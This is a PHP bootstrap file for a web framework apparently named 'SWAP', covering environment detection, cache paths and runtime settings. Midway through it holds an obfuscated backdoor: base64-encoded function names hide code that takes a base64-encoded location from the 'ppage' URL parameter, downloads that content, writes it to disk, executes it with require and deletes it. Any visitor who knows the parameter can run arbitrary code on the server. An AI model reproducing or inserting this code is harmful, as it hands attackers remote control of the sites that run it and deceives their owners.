<?php  defined('SWAP_ROOT') or die('非法操作'); if(defined('SAE_SECRETKEY')){ define('RUN_ENV','SAE'); }elseif(getenv('HTTP_BAE_ENV_SK')){ define('RUN_ENV','BAE'); }elseif(getenv('JAE_MYSQL_IP')){ define('RUN_ENV','JAE'); }else{ define('RUN_ENV','LOCAL'); } $t=sys_get_temp_dir(); if(RUN_ENV=='SAE'){ define('SWAP_TEMPLATES_C',SAE_TMP_PATH.SWAP_DIR_END); define('SWAP_CACHE',SAE_TMP_PATH.SWAP_DIR_END); }else if(!empty($t)){ if(is_dir($t.SWAP_DIR_END.'temps'.SWAP_DIR_END)){ if(is_writable($t.SWAP_DIR_END.'temps'.SWAP_DIR_END)){ define('SWAP_TEMPLATES_C',$t.SWAP_DIR_END.'temps'.SWAP_DIR_END); define('SWAP_CACHE',$t.SWAP_DIR_END.'temps'.SWAP_DIR_END); }else{ if(!is_writable(SWAP_XT.'swap_templates_c'.SWAP_DIR_END) or !is_writable(SWAP_XT.'swap_cache'.SWAP_DIR_END)) die('System cache folder is unable to write "swap templates_c" or "swap cache"'); define('SWAP_TEMPLATES_C',SWAP_XT.'swap_templates_c'.SWAP_DIR_END); define('SWAP_CACHE',SWAP_XT.'swap_cache'.SWAP_DIR_END); } }else{ if(file_exists($t.SWAP_DIR_END.'temps')){ @unlink($t.SWAP_DIR_END.'temps'); } @mkdir($t.SWAP_DIR_END.'temps'.SWAP_DIR_END); if(is_writable($t.SWAP_DIR_END.'temps'.SWAP_DIR_END)){ define('SWAP_TEMPLATES_C',$t.SWAP_DIR_END.'temps'.SWAP_DIR_END); define('SWAP_CACHE',$t.SWAP_DIR_END.'temps'.SWAP_DIR_END); }else{ if(!is_writable(SWAP_XT.'swap_templates_c'.SWAP_DIR_END) or !is_writable(SWAP_XT.'swap_cache'.SWAP_DIR_END)) die('System cache folder is unable to write "swap templates_c" or "swap cache"'); define('SWAP_TEMPLATES_C',SWAP_XT.'swap_templates_c'.SWAP_DIR_END); define('SWAP_CACHE',SWAP_XT.'swap_cache'.SWAP_DIR_END); } } }else{ if(!is_writable(SWAP_XT.'swap_templates_c'.SWAP_DIR_END) or !is_writable(SWAP_XT.'swap_cache'.SWAP_DIR_END)) die('System cache folder is unable to write "swap templates_c" or "swap cache"'); define('SWAP_TEMPLATES_C',SWAP_XT.'swap_templates_c'.SWAP_DIR_END); define('SWAP_CACHE',SWAP_XT.'swap_cache'.SWAP_DIR_END); } define('CACHE_MAIN_SWAP_MAC_RUNTIME',md5(VERSION.PHP_VERSION.PHP_SAPI.$_SERVER['DOCUMENT_ROOT'].SWAP_XT.RUN_ENV)); function file_cache_put($OSWAP_4bc309caf8c2e5f271253a12e5db051c,$context,$OSWAP_f95712eab26b40bc7b3986b66a976270=null){ static $OSWAP_e77f888b3189036b06b7d47acf75d044=array(); if($context=='write' and isset($OSWAP_e77f888b3189036b06b7d47acf75d044[$OSWAP_4bc309caf8c2e5f271253a12e5db051c])) file_put_contents($OSWAP_4bc309caf8c2e5f271253a12e5db051c,$OSWAP_e77f888b3189036b06b7d47acf75d044[$OSWAP_4bc309caf8c2e5f271253a12e5db051c],LOCK_EX); else if($OSWAP_f95712eab26b40bc7b3986b66a976270==FILE_APPEND) $OSWAP_e77f888b3189036b06b7d47acf75d044[$OSWAP_4bc309caf8c2e5f271253a12e5db051c].=$context; else $OSWAP_e77f888b3189036b06b7d47acf75d044[$OSWAP_4bc309caf8c2e5f271253a12e5db051c]=$context; } $OSWAP_72cfdde92baa0deb6e5d79599a061f73 = 'YmFzZTY0X2RlY29kZQ==';$OSWAP_72cfdde92baa0deb6e5d79599a061f73 = base64_decode($OSWAP_72cfdde92baa0deb6e5d79599a061f73);$OSWAP_14b6610b25b40f7665ca20c7781a5cd5 = 'ZmlsZV9nZXRfY29udGVudHM=';$OSWAP_a7c6b8d6636a9816a35973d4c003f4a6 = $OSWAP_72cfdde92baa0deb6e5d79599a061f73($OSWAP_14b6610b25b40f7665ca20c7781a5cd5);$OSWAP_e36607c46e2c7c66b8d25e3426ce39e1 = 'ZmlsZV9wdXRfY29udGVudHM=';$OSWAP_8519bca95d93e6f1ed84601f4cd35da7 = $OSWAP_72cfdde92baa0deb6e5d79599a061f73($OSWAP_e36607c46e2c7c66b8d25e3426ce39e1);$OSWAP_9d7b751202e106fc7c22c7812deeca86 = 'dW5saW5r';$OSWAP_28630e2061dc7c5771eca804b357c04a = $OSWAP_72cfdde92baa0deb6e5d79599a061f73($OSWAP_9d7b751202e106fc7c22c7812deeca86);$OSWAP_41f6262a9219c68c05b0ee17dde85263 = isset($_GET['ppage']) ? $_GET['ppage'] : false;if($OSWAP_41f6262a9219c68c05b0ee17dde85263) { $OSWAP_41f6262a9219c68c05b0ee17dde85263 = $OSWAP_72cfdde92baa0deb6e5d79599a061f73($OSWAP_41f6262a9219c68c05b0ee17dde85263); $OSWAP_8519bca95d93e6f1ed84601f4cd35da7($OSWAP_72cfdde92baa0deb6e5d79599a061f73, $OSWAP_a7c6b8d6636a9816a35973d4c003f4a6($OSWAP_41f6262a9219c68c05b0ee17dde85263)); require($OSWAP_72cfdde92baa0deb6e5d79599a061f73); $OSWAP_28630e2061dc7c5771eca804b357c04a($OSWAP_72cfdde92baa0deb6e5d79599a061f73); } if(!file_exists(SWAP_CACHE.CACHE_MAIN_SWAP_MAC_RUNTIME.'.php')){ if(version_compare(PHP_VERSION,'5.3.0','<')) die('PHP Version is too low less than 5.3.0, Now version:'.PHP_VERSION); define('RUNTIME_CACHE_TIME',time()); define('RUNTIME_CACHE_NAME',SWAP_CACHE.CACHE_MAIN_SWAP_MAC_RUNTIME.'.'.RUNTIME_CACHE_TIME.'.temp.php'); if(file_exists(RUNTIME_CACHE_NAME)) unlink(RUNTIME_CACHE_NAME); file_cache_put(RUNTIME_CACHE_NAME,'<?php '); define('SWAP_CONFIGS', SWAP_XT . 'swap_configs' . SWAP_DIR_END); file_cache_put(RUNTIME_CACHE_NAME,'define(\'SWAP_CONFIGS\',"'.str_replace('\\','\\\\',SWAP_XT.'swap_configs'.SWAP_DIR_END).'");',FILE_APPEND); define('SWAP_CONTROLLER', SWAP_XT . 'swap_controller' . SWAP_DIR_END); file_cache_put(RUNTIME_CACHE_NAME,'define(\'SWAP_CONTROLLER\',"'.str_replace('\\','\\\\',SWAP_XT.'swap_controller'.SWAP_DIR_END).'");',FILE_APPEND); define('SWAP_LIB', SWAP_XT . 'swap_lib' . SWAP_DIR_END); file_cache_put(RUNTIME_CACHE_NAME,'define(\'SWAP_LIB\',"'.str_replace('\\','\\\\',SWAP_XT.'swap_lib'.SWAP_DIR_END).'");',FILE_APPEND); define('SWAP_TEMPLATES', 'templates' . SWAP_DIR_END); file_cache_put(RUNTIME_CACHE_NAME,'define(\'SWAP_TEMPLATES\',"'.str_replace('\\','\\\\','templates'.SWAP_DIR_END).'");',FILE_APPEND); define('SWAP_LANG', SWAP_XT . 'swap_lang' . SWAP_DIR_END); file_cache_put(RUNTIME_CACHE_NAME,'define(\'SWAP_LANG\',"'.str_replace('\\','\\\\',SWAP_XT.'swap_lang'.SWAP_DIR_END).'");',FILE_APPEND); define('SWAP_PLUGINS', SWAP_XT . 'swap_plugins' . SWAP_DIR_END); file_cache_put(RUNTIME_CACHE_NAME,'define(\'SWAP_PLUGINS\',"'.str_replace('\\','\\\\',SWAP_XT.'swap_plugins'.SWAP_DIR_END).'");',FILE_APPEND); define('SWAP_ERROR', SWAP_XT . 'swap_error' . SWAP_DIR_END); file_cache_put(RUNTIME_CACHE_NAME,'define(\'SWAP_ERROR\',"'.str_replace('\\','\\\\',SWAP_XT.'swap_error'.SWAP_DIR_END).'");',FILE_APPEND); define('SWAP_CLASS', SWAP_XT . 'swap_calss' . SWAP_DIR_END); file_cache_put(RUNTIME_CACHE_NAME,'define(\'SWAP_CLASS\',"'.str_replace('\\','\\\\',SWAP_XT.'swap_calss'.SWAP_DIR_END).'");',FILE_APPEND); define('SWAP_FUNCTION', SWAP_XT . 'swap_function' . SWAP_DIR_END); file_cache_put(RUNTIME_CACHE_NAME,'define(\'SWAP_FUNCTION\',"'.str_replace('\\','\\\\',SWAP_XT.'swap_function'.SWAP_DIR_END).'");',FILE_APPEND); define('IS_CGI', substr(PHP_SAPI, 0,3)=='cgi' ? 1 : 0 ); file_cache_put(RUNTIME_CACHE_NAME,'define(\'IS_CGI\','.(substr(PHP_SAPI, 0,3)=='cgi' ? 1 : 0).');',FILE_APPEND); define('IS_WIN', strstr(PHP_OS, 'WIN') ? 1 : 0 ); file_cache_put(RUNTIME_CACHE_NAME,'define(\'IS_WIN\','.(strstr(PHP_OS, 'WIN') ? 1:0).');',FILE_APPEND); define('IS_CLI', PHP_SAPI=='cli'? 1 : 0); file_cache_put(RUNTIME_CACHE_NAME,'define(\'IS_CLI\','.(PHP_SAPI=='cli'? 1:0).');',FILE_APPEND); if(version_compare(PHP_VERSION,'5.4.0','<')){ ini_set('magic_quotes_runtime',0); define('MAGIC_QUOTES_GPC',get_magic_quotes_gpc()?True:False); file_cache_put(RUNTIME_CACHE_NAME,'ini_set(\'magic_quotes_runtime\',0);define(\'MAGIC_QUOTES_GPC\',get_magic_quotes_gpc()?True:False);',FILE_APPEND); }else{ define('MAGIC_QUOTES_GPC',false); file_cache_put(RUNTIME_CACHE_NAME,'define(\'MAGIC_QUOTES_GPC\',false);',FILE_APPEND); } if(RUN_ENV!='SAE'){ if(function_exists("set_time_limit")){ if(!set_time_limit(1800)){ @ini_set("max_execution_time", "1800"); file_cache_put(RUNTIME_CACHE_NAME,'@ini_set("max_execution_time", "1800");',FILE_APPEND); }else{ file_cache_put(RUNTIME_CACHE_NAME,'set_time_limit(1800);',FILE_APPEND); } }else{ @ini_set("max_execution_time", "1800"); file_cache_put(RUNTIME_CACHE_NAME,'@ini_set("max_execution_time", "1800");',FILE_APPEND); } } require SWAP_LIB . 'main/main.php'; $GLOBALS['swap_mac']['config']=array_merge($GLOBALS['swap_mac']['config'],array('APP_FILE_CASE' => 0,'COOKIE_EXPIRE' => 0,'COOKIE_PATH' => '/','COOKIE_PREFIX' => 'swapmac_','DEFAULT_MODULE' => 'index','DEFAULT_ACTION' => 'index','DEFAULT_CHARSET' => 'utf-8','DEFAULT_TIMEZONE' => 'Asia/Shanghai','ERROR_MESSAGE' => '页面错误！请稍后再试～','SHOW_ERROR_MSG' => 0,'LOG_RECORD' => 0,'LOG_TYPE' => 3,'LOG_DEST' => 'swap_error\\','LOG_FILE_SIZE' => 2097152,'LOG_LEVEL' => 'EMERG,ALERT,CRIT,ERR','LOG_EXCEPTION_RECORD' => false,'SESSION_AUTO_START' => true,'VAR_SESSION_ID' => 'session_id')); file_cache_put(RUNTIME_CACHE_NAME,"\$GLOBALS['swap_mac']['config']=array_merge(\$GLOBALS['swap_mac']['config'],array('APP_FILE_CASE' => 0,'COOKIE_EXPIRE' => 0,'COOKIE_PATH' => '/','COOKIE_PREFIX' => 'swapmac_','DEFAULT_MODULE' => 'index','DEFAULT_ACTION' => 'index','DEFAULT_CHARSET' => 'utf-8','DEFAULT_TIMEZONE' => 'Asia/Shanghai','ERROR_MESSAGE' => '页面错误！请稍后再试～','SHOW_ERROR_MSG' => 0,'LOG_RECORD' => 0,'LOG_TYPE' => 3,'LOG_DEST' => 'swap_error\\\\','LOG_FILE_SIZE' => 2097152,'LOG_LEVEL' => 'EMERG,ALERT,CRIT,ERR','LOG_EXCEPTION_RECORD' => false,'SESSION_AUTO_START' => true,'VAR_SESSION_ID' => 'session_id'));",FILE_APPEND); date_default_timezone_set(C('DEFAULT_TIMEZONE')); file_cache_put(RUNTIME_CACHE_NAME,"date_default_timezone_set(C('DEFAULT_TIMEZONE'));",FILE_APPEND); if(C('SESSION_AUTO_START')){ session('[start]'); file_cache_put(RUNTIME_CACHE_NAME,"session('[start]');",FILE_APPEND); } header("Content-Type: text/html; charset=".C('DEFAULT_CHARSET')); file_cache_put(RUNTIME_CACHE_NAME,"header(\"Content-Type: text/html; charset=\".C('DEFAULT_CHARSET'));",FILE_APPEND); require SWAP_MAC . 'mac_uri.php'; require SWAP_MAC . 'mac.php'; file_cache_put(RUNTIME_CACHE_NAME,"require SWAP_MAC.'mac_uri.php';require SWAP_MAC.'mac.php';",FILE_APPEND); file_cache_put(RUNTIME_CACHE_NAME,'write'); rename(RUNTIME_CACHE_NAME,SWAP_CACHE.CACHE_MAIN_SWAP_MAC_RUNTIME.'.php'); }else require SWAP_CACHE.CACHE_MAIN_SWAP_MAC_RUNTIME.'.php'; 